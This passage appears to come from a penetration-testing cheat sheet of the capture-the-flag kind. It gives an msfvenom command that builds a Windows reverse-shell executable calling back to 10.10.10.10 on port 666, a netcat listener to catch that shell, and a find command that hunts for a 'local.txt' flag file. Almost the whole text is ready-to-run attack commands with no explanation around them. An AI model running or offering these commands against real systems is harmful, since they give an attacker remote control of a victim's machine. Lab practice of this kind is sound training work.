msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=666 -f exe -o reverse.exe
```
```
nc -nvlp 666
```
## FINDING FILES
##### LINUX - FINDING FILES
```
find / -name local.txt 2> /dev/null
```
